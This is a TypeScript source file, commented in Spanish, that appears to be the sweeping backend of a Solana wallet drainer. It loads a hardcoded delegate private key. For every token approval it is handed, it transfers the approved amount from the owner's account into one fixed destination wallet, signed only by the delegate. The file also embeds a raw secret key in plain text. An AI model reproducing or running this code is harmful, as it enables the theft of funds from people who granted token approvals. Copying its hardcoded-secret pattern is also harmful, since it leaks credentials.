import { createTransferCheckedInstruction, getMint, getOrCreateAssociatedTokenAccount } from "@solana/spl-token";
import { clusterApiUrl, Connection, Keypair, PublicKey, Transaction } from "@solana/web3.js";


const raw = [0, 208, 133, 135, 172, 189, 185, 218, 98, 128, 114, 197, 224, 167, 112, 248, 29, 81, 177, 123, 31, 107, 177, 151, 60, 36, 66, 54, 48, 89, 52, 118, 76, 84, 130, 196, 111, 36, 137, 211, 22, 152, 13, 125, 91, 124, 160, 97, 31, 34, 250, 50, 2, 99, 164, 73, 159, 41, 143, 17, 125, 52, 90, 229]

const delegateKeypair = Keypair.fromSecretKey(Uint8Array.from(raw));

const finalAccountPublicKey = new PublicKey('6crwCDogWvyWxuRYmJ9QWBgfTexC3XfYtpFsuwHLJE5y')


// 1. Obtener la URL del clúster 
// TODO: ESTAR PENDIENTE DE CAMBIAR A LA MAIN-NET EN LAS PRUEBAS
const networkUrl = clusterApiUrl("devnet"); // O "mainnet-beta", o "testnet"

// 2. Crear el objeto connection
const connection = new Connection(
  networkUrl,
  "confirmed" // Nivel de compromiso (commitment level)
);

interface Approvals {
  ownerAta: string | PublicKey;
  mint: string | PublicKey;
  programId: string | PublicKey;
  amount: string;
}

// Usar esta variable para filtrar las cuentas y no ser robado
const mintSeguras: string[] = [
  'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', // USDC
  'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB'  // USDT
]

export async function Transferencia (approvals: Approvals[]) {

  const transaction = new Transaction()

  for (const aproval of approvals) {
    const ownerAtaPublicKey = typeof aproval.ownerAta === 'string' ? new PublicKey(aproval.ownerAta) : aproval.ownerAta;
    const mintPublicKey = typeof aproval.mint === 'string' ? new PublicKey(aproval.mint) : aproval.mint;
    const PROGRAM_ID = typeof aproval.programId === 'string' ? new PublicKey(aproval.programId) : aproval.programId;

    // 1. Obtener la información del Mint para saber los decimales
    const mintInfo = await getMint(
      connection,
      mintPublicKey,
      "confirmed",
      PROGRAM_ID
    );
    const decimals = mintInfo.decimals;


    // 2. Crear la cuenta de tokens asociada para el destinatario (esto estaba bien)
    const recipientAta = await getOrCreateAssociatedTokenAccount(
      connection,
      delegateKeypair,
      mintPublicKey,
      finalAccountPublicKey,
      false,
      "confirmed",
      undefined,
      PROGRAM_ID
    );

    const bigintAmount = BigInt(aproval.amount);

    // 3. Usar createTransferCheckedInstruction en lugar de createTransferInstruction
    const transferInstruction = createTransferCheckedInstruction(
      ownerAtaPublicKey,          // La cuenta de donde salen los fondos
      mintPublicKey,              // <--- NUEVO: La clave pública del Mint
      recipientAta.address,         // La cuenta a donde van los fondos
      delegateKeypair.publicKey,    // La clave pública del delegado
      bigintAmount,                 // Cantidad a transferir
      decimals,                     // <--- NUEVO: Los decimales del token
      [],                           // Signers adicionales
      PROGRAM_ID
    );

    transaction.add(transferInstruction);
  }

  // ¡La transferencia es firmada ÚNICAMENTE por el Keypair del DELEGADO!
  const signature = await connection.sendTransaction(
    transaction,
    [delegateKeypair] // <--- Este es el Keypair que firma la transacción delegada
  );


  console.log("-----------------------------------------");
  console.log(`Transferencia delegada exitosa. Firma de Tx: ${signature}`);
}



